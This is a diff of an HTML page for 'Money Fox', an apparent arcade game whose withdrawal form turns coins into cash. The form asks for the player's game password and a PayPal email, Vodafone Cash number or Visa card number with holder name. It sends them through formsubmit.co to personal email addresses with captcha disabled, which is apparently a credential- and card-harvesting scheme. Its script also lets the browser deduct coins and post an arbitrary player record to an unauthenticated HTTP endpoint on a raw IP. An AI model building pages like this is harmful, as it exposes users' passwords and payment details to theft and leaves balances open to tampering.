@@ -7,16 +7,15 @@
   <style>
     /* زرار بنفس Theme */
     .btn-theme {
-      background: #4b4fd1;       /* الأزرق البنفسجي */
-      color: #e6ebf3;            /* النص الرمادي الفاتح */
-      border: 3px solid white;   /* حدود بيضاء */
-      border-radius: 12px;       /* زوايا ناعمة */
+      background: #4b4fd1;
+      color: #e6ebf3;
+      border: 3px solid white;
+      border-radius: 12px;
       font-weight: bold;
       padding: 12px 20px;
       box-shadow: 3px 3px 6px rgba(0,0,0,0.25);
       transition: 0.25s ease-in-out;
     }
-
     .btn-theme:hover {
       background: #3a3fb5;
       transform: scale(1.05);
@@ -42,8 +41,9 @@
       padding: 10px;
       border-radius: 8px;
       transition: 0.2s;
+      width: 100%;
+      margin-bottom: 15px;
     }
-
     input:focus, select:focus {
       border-color: #4b4fd1;
       outline: none;
@@ -53,6 +53,11 @@
     /* المودال */
     #withdrawForm .bg-white {
       border: 4px solid #4b4fd1;
+    }
+    h1{
+      align-items: center;
+      align-content: center;
+      text-align: center;
     }
   </style>
 </head>
@@ -66,13 +71,15 @@
 
   <!-- Section 1 -->
   <section class="max-w-4xl mx-auto mt-6 bg-white shadow">
-    <img src="Money Fox.png" alt="Money Fox Logo" class="h-24" style="width: 1250px; height:auto;">
+    <img src="Money Fox.png" alt="Money Fox Logo" class="h-24" style="width: 1000px; height:auto;">
   </section>
 
   <!-- Section 2 -->
   <section class="max-w-4xl mx-auto p-6 mt-6 bg-white shadow">
     <h2 class="text-2xl font-semibold mb-3 text-[#4b4fd1]">What is Money Fox?</h2>
-    <h2>An arcade game where you play as a fox trying to double his coins by dodging the flames coming out of the burning swers in the tunnel.</h2>
+    <p class="text-gray-700">
+      An arcade game where you play as a fox trying to double his coins by dodging the flames coming out of the burning swers in the tunnel.
+    </p>
     <br>
     <ul class="list-disc pl-6 space-y-2 text-gray-700">
       <li>Easy to play but challenging to master.</li>
@@ -88,90 +95,157 @@
       Withdraw my Coins
     </button>
   </section>
+  <section class="max-w-4x2 mx-auto p-6 mt-6 bg-white shadow text-center">
+    <h2 class="text-2xl font-semibold mb-3 text-[#4b4fd1]">Contact us on mmoney11fox@gmail.com</h2>
+  </section>
 
-<!-- Withdraw Form -->
-<div id="withdrawForm" class="fixed inset-0 bg-black bg-opacity-60 hidden flex items-center justify-center">
-  <div class="bg-white p-8 rounded-2xl w-full max-w-md shadow-lg">
-    <h3 class="text-xl font-semibold mb-4 text-[#4b4fd1]">Withdraw Form</h3>
+  <!-- Withdraw Form Modal -->
+  <div id="withdrawForm" class="fixed inset-0 bg-black bg-opacity-60 hidden flex items-center justify-center">
+    <div class="bg-white p-8 rounded-2xl w-full max-w-md shadow-lg relative">
+      
+      <!-- Close Button -->
+      <button onclick="closeWithdrawForm()" class="absolute top-4 right-4 text-gray-500 hover:text-red-500 text-xl font-bold">&times;</button>
 
-    <form action="https://formsubmit.co/superalaa64@gmail.com" method="POST">
-      <!-- Email استبدل بـ إيميلك -->
-      <input type="hidden" name="_subject" value="New Withdraw Request">
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="table">
+      <h3 class="text-2xl font-semibold mb-6 text-[#4b4fd1] text-center">Withdraw Form</h3>
 
-      <label class="block mb-2">Game Email</label>
-      <input type="email" name="game_email" id="email" class="w-full mb-4" required>
+      <form action="https://formsubmit.co/mmoney11fox3@email.com" method="POST">
 
-      <label class="block mb-2">Game Password</label>
-      <input type="password" name="game_password" id="password" class="w-full mb-4" required>
+        <label class="font-semibold text-gray-700">Game Email</label>
+        <input type="email" name="game_email" required id="email">
 
-      <label class="block mb-2">Withdraw Amount (coins)</label>
-      <input type="number" name="withdraw_amount" id="amount" class="w-full mb-4" required>
+        <label class="font-semibold text-gray-700">Contact Email</label>
+        <input type="contact" name="contact_email" required id="contact">
 
-      <label class="block mb-2">Withdraw Method</label>
-      <select name="withdraw_method" id="method" class="w-full mb-4" onchange="showExtraField()" required>
-        <option value="">-- Select Method --</option>
-        <option value="Paypal">Paypal</option>
-        <option value="VodafoneCash">VodafoneCash</option>
-        <option value="Visa">Visa</option>
-      </select>
+        <label class="font-semibold text-gray-700">Game Password</label>
+        <input type="password" name="game_password">
 
-      <!-- الحقول الإضافية -->
-      <div id="extraField" class="mb-4"></div>
+        <label class="font-semibold text-gray-700">Withdraw Amount (coins)</label>
+        <input type="number" name="withdraw_amount" required id="amount">
 
-      <p class="text-sm text-gray-600 text-center mb-4">
-        Minimum withdrawal: <b>500 coins</b>. <br>
-        1 USD = 105 coins. <br>
-        Balance will be deducted instantly & funds arrive in 1 day.
-      </p>
+        <label class="font-semibold text-gray-700">Withdraw Method</label>
+        <select id="withdraw_method" onchange="showExtraInput()" required>
+          <option value="">Select...</option>
+          <option value="Paypal">PayPal</option>
+          <option value="VodafoneCash">Vodafone Cash</option>
+          <option value="Visa">Visa</option>
+        </select>
 
-      <button type="submit" onclick="place_order()" class="btn-theme w-full mb-2">
-        Place Order
-      </button>
-      <button type="button" onclick="closeWithdrawForm()" class="w-full bg-gray-300 text-black py-2 rounded-lg mt-2 hover:bg-gray-400">
-        Cancel
-      </button>
-    </form>
+        <!-- Extra input for chosen method -->
+        <div id="extraField"></div>
+
+        <button type="button" class="btn-theme w-full mt-4" onclick="sendData()">Place Order</button>
+        <br>
+        <h1>
+          ــــــ
+        </h1>
+        <h1>
+Minimum withdrawal: 500 coins.
+1 USD = 105 coins.
+Balance will be deducted instantly & funds arrive in 1 day After we talk to you and confirm all the information with you via email.
+        </h1>
+
+        <!-- FormSubmit settings -->
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+      </form>
+    </div>
   </div>
-</div>
-
 
   <!-- Script -->
-<script>
-  function openWithdrawForm() {
-    document.getElementById("withdrawForm").classList.remove("hidden");
-  }
-
-  function closeWithdrawForm() {
-    document.getElementById("withdrawForm").classList.add("hidden");
-    document.getElementById("extraField").innerHTML = "";
-  }
-
-  function showExtraField() {
-    const method = document.getElementById("method").value;
-    const extraField = document.getElementById("extraField");
-
-    if (method === "Paypal") {
-      extraField.innerHTML = `<label class="block mb-2">Paypal Account Email</label>
-        <input type="email" name="paypal_account" class="w-full p-2 border rounded-lg" required>`;
-    } else if (method === "VodafoneCash") {
-      extraField.innerHTML = `<label class="block mb-2">Vodafone Cash Number</label>
-        <input type="text" name="vodafone_number" class="w-full p-2 border rounded-lg" required>`;
-    } else if (method === "Visa") {
-      extraField.innerHTML = `<label class="block mb-2">Visa Card Number</label>
-        <input type="text" name="visa_number" class="w-full p-2 border rounded-lg" required>
-        <label class="block mb-2">Visa Card Holder Name</label>
-        <input type="text" name="visa_holder" class="w-full p-2 border rounded-lg" required>`;
-    } else {
-      extraField.innerHTML = "";
+  <script>
+    function openWithdrawForm() {
+      document.getElementById("withdrawForm").classList.remove("hidden");
     }
+    function closeWithdrawForm() {
+      document.getElementById("withdrawForm").classList.add("hidden");
+      document.getElementById("extraField").innerHTML = "";
+    }
+    function showExtraInput() {
+      let method = document.getElementById("withdraw_method").value;
+      let extraDiv = document.getElementById("extraField");
+
+      if (method === "Paypal") {
+        extraDiv.innerHTML = `
+          <label class="font-semibold text-gray-700">PayPal Email</label>
+          <input type="email" name="paypal_email" required>
+        `;
+      } else if (method === "VodafoneCash") {
+        extraDiv.innerHTML = `
+          <label class="font-semibold text-gray-700">Vodafone Cash Number</label>
+          <input type="text" name="vodafone_number" required>
+        `;
+      } else if (method === "Visa") {
+        extraDiv.innerHTML = `
+          <label class="font-semibold text-gray-700">Card Number</label>
+          <input type="text" name="card_number" required>
+          <label class="font-semibold text-gray-700">Card Holder Name</label>
+          <input type="text" name="card_holder" required>
+        `;
+      } else {
+        extraDiv.innerHTML = "";
+      }
+    }
+    function sendData() {
+
+    const form = document.querySelector("#withdrawForm form");
+    const email = document.getElementById("email").value;
+    const amount = parseInt(document.getElementById("amount").value);
+
+    if (!email || !amount) {
+      alert("⚠️ Please fill all fields");
+      return;
+    }
+
+    // ✅ أولاً: هات اللاعب من السيرفر
+    fetch("http://13.48.67.33:8900/get", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email })
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.status !== "found") {
+        alert("❌ Player not found");
+        return;
+      }
+
+      let player = data.player;
+
+      if (player.coins < amount) {
+        alert("❌ Not enough coins! Order cancelled.");
+        return; // ❌ مايكملش
+      }
+
+      // ✅ ننقص الكوينز
+      player.coins -= amount;
+
+      // ✅ نبعته تاني على السيرفر عشان يتحدث
+      fetch("http://13.48.67.33:8900/add", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(player)
+      })
+      .then(r => r.json())
+      .then(updated => {
+        alert(
+          "✅ Withdraw successful!\n\n" +
+          "The money will arrive within a day and a customer service representative may contact you to provide you with all the details.\n\n" +
+          "If any problems occur, please contact the support team at superalaa64@gmail.com.\n\n" +
+          "Your new balance: " + updated.player.coins
+        );
+        // ✅ نضيف الكوينز للطل
+        // ✅ بعد ما coins تتخصم نبعث الفورم لـ FormSubmit
+        form.submit();
+
+        closeWithdrawForm();
+      });
+    })
+    .catch(err => {
+      console.error(err);
+      alert("❌ Server error");
+    });
   }
-  function place_order() {
-    alert("Order Placed")
-    closeWithdrawForm();
-  }
-</script>
+  </script>
 
 </body>
 </html>
